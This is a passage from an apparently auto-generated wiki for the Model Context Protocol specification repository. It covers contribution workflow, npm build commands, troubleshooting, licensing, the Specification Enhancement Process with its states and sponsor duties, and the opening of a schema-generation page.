3. Check for issues: `npm run check:docs` (validates formatting, broken links, and common issues)

Sources: [docs/community/contributing.mdx:316-350]()

### Major Protocol Changes

For significant changes, follow the [SEP process](#7.2). Before spending significant time on a spec proposal:

1. **Validate your idea first** - Discuss in an [Interest Group](#8.3) or on [Discord](https://discord.gg/6CSzBmMkjX)
2. **Build a prototype** - Demonstrate practical application of your idea
3. **Find a sponsor** - A maintainer from the [maintainer list](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md) who will champion your proposal
4. **Write the SEP** - Follow the [SEP Guidelines](#7.2)

Sources: [docs/community/contributing.mdx:352-373]()

---

## Working with SDK Repositories

MCP maintains official SDKs in multiple languages. Contributions are welcome—whether fixing bugs, improving performance, adding features, or enhancing documentation.

Each SDK has its own repository, maintainers, and contribution guidelines. Some SDKs are maintained in collaboration with larger partner organizations (Google, Microsoft, JetBrains, etc.), so processes may vary slightly.

### Before Contributing to an SDK

1. **Open an issue first** - Before starting significant work, open an issue to discuss your approach. This avoids duplicate effort and ensures alignment with the SDK's direction.
2. **Join the SDK channel** - Find the relevant channel in [Discord](https://discord.gg/6CSzBmMkjX) (e.g., `#typescript-sdk-dev`, `#python-sdk-dev`)
3. **Read the SDK's CONTRIBUTING.md** - Each repository has specific instructions for setup, coding standards, commit conventions, and PR requirements
4. **Write tests** - All contributions should include appropriate test coverage. Bug fixes should include a test reproducing the issue; new features should have tests covering expected behavior.

Sources: [docs/community/contributing.mdx:375-412]()

---

## Communication and Getting Help

### Communication Channels

| Channel | Purpose | When to Use |
|---------|---------|------------|
| [Discord](https://discord.gg/6CSzBmMkjX) | Real-time discussion | Quick questions, coordination, WG/IG discussions |
| [GitHub Discussions](https://github.com/modelcontextprotocol/modelcontextprotocol/discussions) | Structured discussion | Feature requests, roadmap planning, proposals needing input |
| [GitHub Issues](https://github.com/modelcontextprotocol/modelcontextprotocol/issues) | Actionable tasks | Bug reports with reproducible steps, documentation fixes |
| [Security reports](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md) | Security issues | Vulnerabilities—**never post publicly** |

This separation helps maintainers focus on work ready for implementation while giving ideas room to develop. If unsure whether something is ready to be an issue, start with a discussion.

For protocol discussions, join [Working Group](#8.3) channels like `#auth-wg` or `#server-identity-wg`. For SDK help, find your language's channel (e.g., `#typescript-sdk-dev`).

Sources: [docs/community/communication.mdx:8-17](), [docs/community/contributing.mdx:469-491]()

### Finding a Sponsor for SEPs

A **sponsor** is a Core Maintainer or Maintainer who champions your SEP through the review process. They provide feedback, help refine your proposal, and present it at Core Maintainer meetings.

**Every SEP needs a sponsor to move forward.** SEPs that don't find a sponsor within 6 months are marked as **dormant**. Dormant SEPs aren't rejected outright—they can be revived later if a sponsor is found or the proposal is re-assessed.

**To find a sponsor:**

1. Look at the [maintainer list](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md) to find maintainers working in your area
2. Tag 1-2 relevant maintainers in your PR (don't spam everyone)
3. Post your PR in the relevant Discord channel to increase visibility
4. If no response after 2 weeks, ask in `#general` or reach out to a Core Maintainer

Maintainers review open proposals regularly, but response time varies based on complexity and availability.

Sources: [docs/community/contributing.mdx:493-527]()

---

## Build System and npm Commands

The specification repository uses npm scripts to manage schema generation, documentation building, validation, and formatting. Here are the key commands:

```bash
# Development servers
npm run serve:docs       # Local Mintlify docs server (http://localhost:3000)
npm run serve:blog       # Local Hugo blog server

# Generation (run after editing source files)
npm run generate         # Generate all (schema + SEPs)
npm run generate:schema  # Generate JSON schemas + MDX from TypeScript
npm run generate:seps    # Generate SEP documents

# Formatting
npm run format           # Format all (docs + schema)
npm run format:docs      # Format markdown/MDX files
npm run format:schema    # Format schema TypeScript files

# Checks
npm run check            # Run all checks
npm run check:schema     # Check schema (TS, JSON, examples, MDX)
npm run check:docs       # Check docs (format, comments, links)
npm run check:seps       # Check SEP documents

# Workflow
npm run prep             # Full prep before committing (check, generate, format)
```

**Always run `npm run prep` before committing** to ensure all checks pass, schemas are regenerated, and formatting is correct.

Sources: [CLAUDE.md:44-69]()

---

## Contribution Workflow Diagram

```mermaid
graph TD
    A["Identify Issue<br/>or Idea"]
    B{"Is it a<br/>major change?"}
    C["Small Change<br/>Direct PR"]
    D["Major Change<br/>SEP Required"]
    E["Fork & Clone<br/>Repository"]
    F["Create Feature<br/>Branch"]
    G["Make Changes<br/>Edit Files"]
    H{"Schema<br/>Changes?"}
    I["Run npm run<br/>generate:schema"]
    J["Run npm run<br/>check"]
    K{"All Checks<br/>Pass?"}
    L["Commit & Push<br/>to Fork"]
    M["Open Pull<br/>Request"]
    N["Find Sponsor<br/>Tag Maintainers"]
    O["Await Review<br/>1-5 Business Days"]
    P["Address<br/>Feedback"]
    Q["Merge &<br/>Complete"]
    
    A --> B
    B -->|No| C
    B -->|Yes| D
    C --> E
    D --> N
    N --> E
    E --> F
    F --> G
    G --> H
    H -->|Yes| I
    H -->|No| J
    I --> J
    J --> K
    K -->|No| P
    K -->|Yes| L
    L --> M
    M --> O
    O --> P
    P --> J
    O --> Q
```

Sources: [docs/community/contributing.mdx:76-212](), [docs/community/sep-guidelines.mdx:42-90]()

---

## Common Issues and Troubleshooting

### `npm run check` fails

**Common causes:**

- **Wrong Node.js version** - Ensure you have Node.js 24+
- **Missing dependencies** - Run `npm install` again
- **Schema out of sync** - Run `npm run generate:schema`
- **Formatting issues** - Run `npm run format` to auto-fix

### My PR has been sitting unnoticed for weeks

1. Ensure all CI checks pass
2. Politely ping the desired reviewer in a comment
3. Ask in the relevant Discord channel
4. For urgent issues, reach out to a Core Maintainer

### I can't find a sponsor for my SEP

1. Make sure your idea has been discussed in Discord or an Interest Group first
2. Proposals with demonstrated community interest are more likely to find sponsors
3. Consider whether your change might be too large—could it be split into smaller SEPs?

### My SEP was rejected

Rejection is not permanent. You have several options:

1. **Address the feedback and resubmit** - Rejection often comes with specific concerns that can be addressed
2. **Discuss in Discord** - Talk with maintainers to better understand the concerns
3. **Try a different approach** - Submit a new SEP addressing the same problem differently
4. **Wait for the right moment** - Circumstances change; an idea rejected today might be welcomed later

Sources: [docs/community/contributing.mdx:529-573]()

---

## Licensing and Code of Conduct

### License

By contributing, you agree that your contributions will be licensed under:

- **Code and specifications**: Apache License 2.0
- **Documentation** (excluding specifications): CC-BY 4.0

See the [LICENSE](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/LICENSE) file for details.

### Code of Conduct

All contributors must follow the [Code of Conduct](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/CODE_OF_CONDUCT.md). We expect respectful, professional, and inclusive interactions across all channels.

### AI Contributions

We welcome the use of AI tools like Claude or ChatGPT to help with your contributions. If you do use AI assistance, let us know in your pull request or issue—a quick note about how you used it (drafting docs, generating code, brainstorming, etc.) is all we need.

The key is that you understand and can stand behind your contribution:

- **You get it** - You understand what the changes do and can explain them
- **You know why** - You can articulate why the change is needed
- **You've verified it** - You've tested or validated that it works as intended

Sources: [docs/community/contributing.mdx:590-620]()

---

## Related Documentation

For more information on specific topics:

- **SEP Process** - See [Specification Enhancement Process](#7.2) for detailed SEP workflow and guidelines
- **Schema Generation** - See [Schema Development and Generation](#7.3) for schema source-of-truth system and transformations
- **Build System** - See [Build System and Automation](#7.4) for npm scripts and CI/CD workflows
- **Documentation Generation** - See [Documentation Generation System](#7.5) for TypeDoc configuration and Mintlify integration
- **Governance** - See [Governance Structure](#8.1) for decision-making processes and maintainer roles
- **Working Groups** - See [Working Groups and Interest Groups](#8.3) for collaboration structures

---

# Page: Specification Enhancement Process (SEP)

# Specification Enhancement Process (SEP)

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [MAINTAINERS.md](MAINTAINERS.md)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx](docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx)
- [docs/community/seps/2133-extensions.mdx](docs/community/seps/2133-extensions.mdx)
- [docs/community/seps/index.mdx](docs/community/seps/index.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/docs.json](docs/docs.json)
- [docs/docs/tutorials/security/security_best_practices.mdx](docs/docs/tutorials/security/security_best_practices.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)
- [schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json](schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json)
- [schema/draft/examples/ServerCapabilities/extensions-ui.json](schema/draft/examples/ServerCapabilities/extensions-ui.json)
- [seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md](seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md)
- [seps/2133-extensions.md](seps/2133-extensions.md)

</details>



The Specification Enhancement Process (SEP) is the formal mechanism for proposing, discussing, and documenting changes to the Model Context Protocol. SEPs are design documents stored as markdown files in the [`seps/` directory](https://github.com/modelcontextprotocol/specification/tree/main/seps) and managed through pull requests. This page describes the complete workflow for creating, sponsoring, reviewing, and finalizing SEPs.

For information about the broader governance structure that oversees the SEP process, see [Governance and Stewardship](#7.1). For details on Working Groups and Interest Groups that often generate SEPs, see [Working Groups and Interest Groups](#7.3).

## What is a SEP?

A SEP (Specification Enhancement Proposal) is a design document that provides information to the MCP community or describes a new feature for the Model Context Protocol. SEPs serve three primary functions:

1. **Proposing major new features** with detailed technical specifications
2. **Collecting community input** on protocol design decisions  
3. **Documenting the rationale** behind decisions that shape the protocol

The SEP author is responsible for building consensus within the community and documenting dissenting opinions. The revision history in Git serves as the historical record of the feature proposal.

Sources: [docs/community/sep-guidelines.mdx:8-10](), [seps/1850-pr-based-sep-workflow.md:12-15]()

## When to Use a SEP

Not all changes require a SEP. Regular pull requests are more appropriate for smaller, direct changes. Consider proposing a SEP when your change involves:

| Scenario | Requires SEP | Example |
|----------|--------------|---------|
| New protocol feature or API | Yes | Adding new message types, capabilities, or server features |
| Breaking change | Yes | Non-backwards-compatible modifications to existing behavior |
| Governance/process change | Yes | Altering contribution guidelines or decision-making processes |
| Complex/controversial topic | Yes | Changes with multiple valid solutions requiring community consensus |
| Bug fix | No | Straightforward corrections to existing functionality |
| Documentation improvement | No | Clarifications or examples without semantic changes |
| Minor enhancement | No | Small improvements that don't alter core protocol behavior |

The goal is to reserve the SEP process for changes substantial enough to require broad community discussion, a formal design document, and a historical record of the decision-making process.

Sources: [docs/community/sep-guidelines.mdx:14-28]()

## SEP Types

SEPs are categorized into three types:

**Standards Track**: Describes a new feature or implementation for the Model Context Protocol, or an interoperability standard supported outside the core protocol specification. These are the most common SEPs and directly modify protocol behavior.

**Informational**: Describes a design issue or provides general guidelines to the MCP community without proposing a new feature. Does not represent a community consensus or recommendation.

**Process**: Describes a process surrounding MCP or proposes changes to project processes (like the SEP process itself). Similar to Standards Track but applies to areas other than the protocol.

Examples:
- **Standards Track**: SEP-1686 (Task-based workflows), SEP-991 (Client ID Metadata Documents)
- **Process**: SEP-1850 (PR-based SEP workflow)
- **Informational**: General best practices documents

Sources: [docs/community/sep-guidelines.mdx:29-36](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:134-240]()

## The PR-Based Workflow

As of November 2025 (SEP-1850), all SEPs are submitted as pull requests containing markdown files. This replaced the previous GitHub Issues-based approach. The PR-based workflow provides:

- **Version control**: Every revision tracked in Git alongside the specification
- **Integrated discussion**: All conversation happens in the pull request thread
- **Automatic numbering**: SEP numbers derive from PR numbers
- **Standard tooling**: Uses GitHub's built-in code review features

```mermaid
graph TD
    Draft["Author creates<br/>seps/0000-feature.md"] --> PR["Opens pull request"]
    PR --> Rename["Renames to<br/>seps/{PR#}-feature.md"]
    Rename --> Sponsor["Finds sponsor from<br/>MAINTAINERS.md"]
    Sponsor --> Assigned["Sponsor assigns<br/>themselves to PR"]
    Assigned --> Status["Status updated<br/>to 'draft'"]
    Status --> Iterate["Author iterates<br/>on feedback"]
    Iterate --> Ready["Sponsor updates<br/>to 'in-review'"]
    Ready --> CoreReview["Core Maintainers<br/>formal review"]
    CoreReview --> Decision{"Decision"}
    Decision -->|Accepted| RefImpl["Reference<br/>implementation"]
    Decision -->|Rejected| Rejected["Status: rejected"]
    Decision -->|Needs work| Iterate
    RefImpl --> Final["Status: final"]
    
    Timeout["No sponsor<br/>after 6 months"] --> Dormant["Status: dormant"]
```

**SEP Workflow: From Draft to Final**

The workflow eliminates manual numbering and keeps all proposal content in a single, version-controlled location.

Sources: [seps/1850-pr-based-sep-workflow.md:23-46](), [blog/content/posts/2025-11-28-sep-process-update.md:20-35]()

## SEP States and Lifecycle

SEPs progress through a defined set of states:

```mermaid
stateDiagram-v2
    [*] --> draft: Sponsor assigned
    draft --> in_review: Sponsor initiates<br/>formal review
    in_review --> accepted: Core Maintainers<br/>approve
    in_review --> rejected: Core Maintainers<br/>reject
    in_review --> draft: Needs revision
    accepted --> final: Reference<br/>implementation<br/>complete
    draft --> withdrawn: Author withdraws
    draft --> dormant: No sponsor<br/>after 6 months
    final --> superseded: Replaced by<br/>newer SEP
    rejected --> [*]
    withdrawn --> [*]
    dormant --> [*]
    superseded --> [*]
    final --> [*]
```

**SEP State Transitions**

| State | Meaning | Who Can Change |
|-------|---------|----------------|
| `draft` | Has sponsor, undergoing informal review | Sponsor |
| `in-review` | Ready for formal Core Maintainer review | Sponsor |
| `accepted` | Approved but needs final wording and reference implementation | Sponsor |
| `rejected` | Rejected by Core Maintainers | Sponsor |
| `withdrawn` | Author withdrew the proposal | Author/Sponsor |
| `final` | Finalized with complete reference implementation | Sponsor |
| `superseded` | Replaced by a newer SEP | Sponsor |
| `dormant` | No sponsor found within six months, PR closed | Core Maintainers |

**Key state transition rules:**
- Only the **sponsor** is responsible for updating the SEP status in the markdown file
- PR labels must be kept in sync with the markdown status field
- Authors request status changes through their sponsor rather than modifying directly
- Reference implementations must be complete before `final` status

Sources: [docs/community/sep-guidelines.mdx:83-93](), [seps/1850-pr-based-sep-workflow.md:64-72]()

## File Structure and Location

All SEPs reside in the `seps/` directory of the specification repository with a standardized naming convention:

```
specification/
├── seps/
│   ├── README.md
│   ├── TEMPLATE.md
│   ├── 0000-feature-name.md        # Placeholder during drafting
│   ├── 1850-pr-based-sep-workflow.md
│   ├── 1686-task-workflows.md
│   ├── 991-client-id-metadata.md
│   └── ...
└── schema/
    └── ...
```

**Naming convention**: `{PR-number}-{descriptive-slug}.md`

The PR number becomes the SEP number. Authors start with `0000-` as a placeholder, then rename once the PR is created.

Example file header:

```markdown
# SEP-1850: PR-Based SEP Workflow

- **Status**: Final
- **Type**: Process
- **Created**: 2025-11-20
- **Author(s)**: Nick Cooper (@nickcoai), David Soria Parra (@davidsp)
- **Sponsor**: David Soria Parra (@davidsp)
- **PR**: https://github.com/modelcontextprotocol/specification/pull/1850
```

Sources: [seps/1850-pr-based-sep-workflow.md:33-41](), [seps/TEMPLATE.md:1-10]()

## Authoring a SEP

### Step-by-Step Authoring Workflow

```mermaid
sequenceDiagram
    participant Author
    participant GitHub
    participant Maintainers as MAINTAINERS.md
    participant Sponsor
    participant CoreMaintainers as Core Maintainers
    
    Author->>Author: Create seps/0000-feature.md<br/>using TEMPLATE.md
    Author->>GitHub: Open PR adding SEP file
    GitHub-->>Author: PR number assigned (e.g., #1850)
    Author->>Author: Rename to seps/1850-feature.md<br/>Update header with PR #
    Author->>Maintainers: Request sponsor by tagging<br/>maintainers in PR
    Note over Maintainers: Maintainers review<br/>open proposals regularly
    Maintainers->>Sponsor: Maintainer volunteers<br/>to sponsor
    Sponsor->>GitHub: Assigns self to PR
    Sponsor->>GitHub: Updates status to 'draft'<br/>Applies 'draft' label
    loop Informal Review
        Sponsor->>Author: Requests changes
        Author->>GitHub: Pushes revisions
    end
    Sponsor->>GitHub: Updates status to 'in-review'<br/>Applies 'in-review' label
    Sponsor->>CoreMaintainers: Presents at bi-weekly meeting
    CoreMaintainers->>CoreMaintainers: Formal review and vote
    alt Accepted
        CoreMaintainers-->>Sponsor: Approved
        Sponsor->>GitHub: Updates status to 'accepted'
        Author->>GitHub: Submits reference implementation
        Sponsor->>GitHub: Updates status to 'final'
    else Rejected
        CoreMaintainers-->>Sponsor: Rejected
        Sponsor->>GitHub: Updates status to 'rejected'
    end
```

**SEP Authorship and Review Sequence**

### Finding a Sponsor

SEPs require a sponsor from the MCP steering group (maintainer, core maintainer, or lead maintainer). The sponsor ensures the proposal:
- Meets quality standards
- Is actively developed
- Gets presented at Core Maintainer meetings

To find a sponsor:
1. Tag potential sponsors from [MAINTAINERS.md](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md) in your PR
2. Maintainers regularly review open proposals to determine which to sponsor
3. If no sponsor is found within **six months**, Core Maintainers may close the PR and mark it `dormant`

You can also discuss your idea first on [Discord](https://discord.gg/6CSzBmMkjX) or [GitHub Discussions](https://github.com/modelcontextprotocol/modelcontextprotocol/discussions) before drafting a formal SEP.

Sources: [docs/community/sep-guidelines.mdx:42-66](), [seps/1850-pr-based-sep-workflow.md:42-46]()

## The Sponsor Role

The sponsor is a critical figure in the SEP lifecycle. This role must be filled by someone from the MCP steering group (maintainers, core maintainers, or lead maintainers).

```mermaid
graph LR
    subgraph "Sponsor Responsibilities"
        Review["Review proposal<br/>and provide feedback"]
        StatusMgmt["Manage status<br/>transitions"]
        Community["Request changes<br/>based on community"]
        Present["Present at<br/>Core Maintainer<br/>meetings"]
        Quality["Ensure quality<br/>standards"]
        Track["Track reference<br/>implementation"]
    end
    
    Sponsor[Sponsor] --> Review
    Sponsor --> StatusMgmt
    Sponsor --> Community
    Sponsor --> Present
    Sponsor --> Quality
    Sponsor --> Track
```

**Sponsor Responsibilities**

### Key Sponsor Duties

1. **Status management**: Update the `Status` field in the SEP markdown file and apply matching PR labels
2. **Review coordination**: Facilitate informal review and request changes based on community feedback
3. **Formal review initiation**: Move SEP from `draft` to `in-review` when ready
4. **Core Maintainer liaison**: Present and discuss the proposal at bi-weekly Core Maintainer meetings
5. **Quality assurance**: Ensure the proposal meets SEP standards before advancing
6. **Implementation tracking**: Monitor reference implementation progress before marking `final`

**Important**: Only sponsors should modify the status field and labels. Authors request status changes through their sponsor.

Sources: [seps/1850-pr-based-sep-workflow.md:48-62](), [docs/community/sep-guidelines.mdx:120-130]()

## Review and Approval Process

Core Maintainers review SEPs on a **bi-weekly basis**. For a SEP to be accepted, it must meet:

- **Prototype implementation** demonstrating the proposal
- **Clear benefit** to the MCP ecosystem
- **Community support** and consensus

```mermaid
graph TD
    subgraph "Informal Review Phase"
        Draft[SEP in 'draft' state]
        Feedback[Community provides<br/>feedback in PR]
        Iterate[Author makes<br/>revisions]
        Draft --> Feedback
        Feedback --> Iterate
        Iterate --> Draft
    end
    
    subgraph "Formal Review Phase"
        Ready[Sponsor marks<br/>'in-review']
        Meeting[Core Maintainer<br/>bi-weekly meeting]
        Vote[Core Maintainers<br/>discuss & vote]
        Ready --> Meeting
        Meeting --> Vote
    end
    
    subgraph "Decision Outcomes"
        Accepted[Status: accepted]
        Rejected[Status: rejected]
        Revision[Return to draft<br/>for changes]
    end
    
    Iterate -.Sponsor decides<br/>ready.-> Ready
    Vote --> Accepted
    Vote --> Rejected
    Vote --> Revision
    Revision --> Draft
```

**SEP Review and Decision Flow**

### Decision Authority

From the governance structure:
- **Core Maintainers** (9 members) review and vote on SEPs
- **Lead Maintainers** (2 BDFLs) can veto any decision
- Consensus is encouraged but not required for votes
- Decision-making should be publicly articulated with clear reasoning

Sources: [docs/community/sep-guidelines.mdx:106-116](), [docs/community/governance.mdx:51-72]()

## Status Management

Status management is a critical sponsor responsibility. The system uses both markdown status fields and PR labels to track SEP state.

### Status Update Mechanism

```mermaid
graph LR
    subgraph "Status Sources of Truth"
        MDFile["SEP markdown file<br/>Status: field<br/>(canonical)"]
        PRLabels["GitHub PR labels<br/>(for filtering)"]
    end
    
    subgraph "Who Updates"
        Sponsor["Sponsor"]
        Author["Author"]
    end
    
    Sponsor -->|Updates| MDFile
    Sponsor -->|Applies| PRLabels
    Author -->|Requests changes via| Sponsor
    
    MDFile -.Kept in sync.-> PRLabels
```

**Status Management: Canonical Source and Labels**

### Why Both Markdown and Labels?

- **Markdown file** serves as the canonical, version-controlled record
- **PR labels** enable easy filtering and searching for SEPs by status without opening files
- Both must be kept in sync by the sponsor

Available labels match the states: `draft`, `in-review`, `accepted`, `rejected`, `withdrawn`, `final`, `superseded`, `dormant`

Sources: [seps/1850-pr-based-sep-workflow.md:107-117](), [docs/community/sep-guidelines.mdx:95-105]()

## SEP Template and Required Sections

All SEPs must follow a standardized structure defined in [seps/TEMPLATE.md]():

### Required Sections

1. **Preamble**: Title, authors, status, type, PR number
2. **Abstract**: ~200 word description of the technical issue
3. **Motivation**: Why the existing protocol is inadequate; critical for acceptance
4. **Specification**: Detailed technical specification for interoperable implementations
5. **Rationale**: Why design decisions were made, alternatives considered, objections documented
6. **Backward Compatibility**: Description of incompatibilities and migration paths (if applicable)
7. **Reference Implementation**: Link to prototype code; must be complete before `final` status
8. **Security Implications**: Security concerns, attack surfaces, privacy considerations

Example preamble structure:

```markdown
# SEP-{NUMBER}: {Title}

- **Status**: Draft | In-Review | Accepted | Rejected | Withdrawn | Final | Superseded | Dormant
- **Type**: Standards Track | Informational | Process
- **Created**: YYYY-MM-DD
- **Author(s)**: Name <email> (@github-username)
- **Sponsor**: @github-username (or "None" if seeking sponsor)
- **PR**: https://github.com/modelcontextprotocol/specification/pull/{NUMBER}
```

### Critical Section: Motivation

SEP submissions without sufficient motivation may be rejected outright. This section must clearly explain why the existing protocol specification is inadequate and what problem the SEP solves.

Sources: [docs/community/sep-guidelines.mdx:68-80](), [seps/TEMPLATE.md:1-85]()

## Relationship to Governance

The SEP process integrates tightly with MCP's governance structure:

```mermaid
graph TB
    subgraph "Leadership Hierarchy"
        Lead["Lead Maintainers (2)<br/>BDFLs, veto power"]
        Core["Core Maintainers (9)<br/>Specification oversight"]
        Maint["Maintainers (58)<br/>Domain specialists"]
    end
    
    subgraph "Community Structures"
        WG["Working Groups<br/>Solution development"]
        IG["Interest Groups<br/>Problem identification"]
        Contributors["Contributors<br/>SEP authors"]
    end
    
    subgraph "SEP Process"
        SEPDraft["SEP Draft<br/>(PR created)"]
        Sponsor["Sponsor Required<br/>(from steering group)"]
        Review["Core Maintainer<br/>Review"]
        Decision["Accept/Reject"]
    end
    
    Lead -->|Can veto| Decision
    Core -->|Vote on| Decision
    Maint -->|Can sponsor| Sponsor
    Core -->|Can sponsor| Sponsor
    Lead -->|Can sponsor| Sponsor
    
    Contributors -->|Submit| SEPDraft
    IG -.Inform.-> SEPDraft
    WG -.Propose.-> SEPDraft
    SEPDraft -->|Requires| Sponsor
    Sponsor -->|Presents to| Review
    Review --> Decision
```

**SEP Process Within Governance Structure**

### Steering Group and Sponsorship

The **MCP steering group** consists of:
- Lead Maintainers (2)
- Core Maintainers (9)  
- Maintainers (58)

Only members of the steering group can act as SEP sponsors. See [MAINTAINERS.md](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md) for the complete list.

### Working and Interest Groups

While participation in Working Groups (WGs) or Interest Groups (IGs) is not required to submit a SEP, building consensus within these groups can:
- Justify the formation of a WG
- Strengthen a SEP's chances of success
- Ensure proposals align with community needs

Many successful SEPs originate from IG discussions identifying problems, then WG collaboration developing solutions.

Sources: [docs/community/governance.mdx:20-28](), [docs/community/working-interest-groups.mdx:6-13](), [MAINTAINERS.md:1-180]()

## Recent SEP Examples

The November 2025 (2025-11-25) specification release included several major SEPs that demonstrate the process in action:

| SEP | Title | Type | Impact |
|-----|-------|------|--------|
| [1850](https://github.com/modelcontextprotocol/specification/pull/1850) | PR-Based SEP Workflow | Process | Changed how SEPs are submitted (this document) |
| [1686](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1686) | Task-based Workflows | Standards Track | Added async operation tracking to protocol |
| [991](https://github.com/modelcontextprotocol/modelcontextprotocol/pull/1296) | Client ID Metadata Documents | Standards Track | Simplified authorization via URL-based client registration |
| [1577](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1577) | Sampling with Tools | Standards Track | Enabled agentic server patterns |
| [1024](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1024) | Client Security Requirements | Standards Track | Security requirements for local server installation |
| [1046](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1046) | OAuth Client Credentials | Standards Track | Machine-to-machine authorization extension |

These SEPs progressed from community identification of needs → Working Group development → formal proposal → Core Maintainer acceptance → implementation → final status.

Sources: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:134-210]()

## Communication Channels

Discuss SEPs and get help through:

- **Discord**: [MCP Contributor Discord](https://discord.gg/6CSzBmMkjX) - Real-time discussion in Working/Interest Group channels
- **GitHub Discussions**: [modelcontextprotocol/modelcontextprotocol](https://github.com/modelcontextprotocol/modelcontextprotocol/discussions) - Structured, long-form discussion
- **GitHub Issues**: For actionable tasks and feature tracking
- **SEP PRs**: All formal SEP discussion happens in pull request comments

Do not post security issues publicly. Follow [SECURITY.md](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md) for responsible disclosure.

Sources: [docs/community/communication.mdx:8-79]()

## Legacy and Migration

Prior to November 2025 (SEP-1850), SEPs were tracked as GitHub Issues. Existing issue-based SEPs remain valid with their original issue numbers. Future SEPs must use the PR-based workflow described in this document.

To migrate an existing issue-based SEP to the new process:
1. Create a markdown file using the SEP template starting with `0000-`
2. Copy and adapt proposal content
3. Submit a pull request to `seps/`
4. Rename file using the new PR number
5. Close the original issue with a link to the new PR

The new PR gets a fresh SEP number. Historical context from the issue should be summarized in the new SEP or referenced via links.

Sources: [blog/content/posts/2025-11-28-sep-process-update.md:53-63](), [seps/1850-pr-based-sep-workflow.md:118-170]()

---

# Page: Schema Development and Generation

# Schema Development Workflow

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.gitattributes](.gitattributes)
- [.prettierignore](.prettierignore)
- [docs/specification/2025-06-18/schema.mdx](docs/specification/2025-06-18/schema.mdx)
- [docs/specification/2025-11-25/schema.mdx](docs/specification/2025-11-25/schema.mdx)
- [docs/style.css](docs/style.css)
- [package-lock.json](package-lock.json)
- [package.json](package.json)
- [schema/2025-06-18/schema.mdx](schema/2025-06-18/schema.mdx)
- [schema/2025-06-18/schema.ts](schema/2025-06-18/schema.ts)
- [schema/2025-11-25/schema.ts](schema/2025-11-25/schema.ts)
- [scripts/check-mdx-comments.ts](scripts/check-mdx-comments.ts)
- [scripts/generate-schemas.ts](scripts/generate-schemas.ts)
- [scripts/pull-registry-docs.sh](scripts/pull-registry-docs.sh)
- [tsconfig.json](tsconfig.json)
- [typedoc.config.mjs](typedoc.config.mjs)
- [typedoc.plugin.mjs](typedoc.plugin.mjs)

</details>



This document covers the technical workflow for developing and maintaining the MCP protocol schemas. It explains how to edit TypeScript schema definitions, generate derived artifacts (JSON Schema and MDX documentation), and validate changes through CI/CD.

For information about the protocol specification content itself, see [Schema System and Message Types](#2.2). For build system details beyond schema generation, see [Build System and CI/CD](#6.4).

## Purpose and Scope

The schema development workflow manages the transformation of canonical TypeScript schemas into multiple generated artifacts:

- **TypeScript schemas** (`schema/*/schema.ts`) are the single source of truth
- **JSON schemas** (`schema/*/schema.json`) are generated for machine consumption and tooling
- **MDX documentation** (`docs/specification/*/schema.mdx`) is generated for human-readable API reference

This document covers editing TypeScript schemas, running generation tools, understanding version-specific transformations, and validating that generated artifacts remain synchronized with the source.

## Schema System Architecture

```mermaid
graph TB
    subgraph "Source of Truth"
        DraftTS["schema/draft/schema.ts<br/>TypeScript Definitions"]
        V20251125TS["schema/2025-11-25/schema.ts"]
        V20250618TS["schema/2025-06-18/schema.ts"]
    end
    
    subgraph "Generation Tools"
        GenScript["scripts/generate-schemas.ts<br/>JSON Schema Generator"]
        TypeDocTool["TypeDoc + Plugin<br/>MDX Generator"]
    end
    
    subgraph "Generated Artifacts"
        DraftJSON["schema/draft/schema.json<br/>JSON Schema 2020-12"]
        V20251125JSON["schema/2025-11-25/schema.json<br/>JSON Schema 2020-12"]
        V20250618JSON["schema/2025-06-18/schema.json<br/>JSON Schema draft-07"]
        
        DraftMDX["docs/specification/draft/schema.mdx"]
        V20251125MDX["docs/specification/2025-11-25/schema.mdx"]
        V20250618MDX["docs/specification/2025-06-18/schema.mdx"]
    end
    
    DraftTS -->|typescript-json-schema| GenScript
    V20251125TS -->|typescript-json-schema| GenScript
    V20250618TS -->|typescript-json-schema| GenScript
    
    GenScript -->|writes| DraftJSON
    GenScript -->|writes| V20251125JSON
    GenScript -->|writes| V20250618JSON
    
    DraftTS -->|typedoc --schemaPageTemplate| TypeDocTool
    V20251125TS -->|typedoc --schemaPageTemplate| TypeDocTool
    V20250618TS -->|typedoc --schemaPageTemplate| TypeDocTool
    
    TypeDocTool -->|writes| DraftMDX
    TypeDocTool -->|writes| V20251125MDX
    TypeDocTool -->|writes| V20250618MDX
```

**Title: Schema Generation Pipeline Architecture**

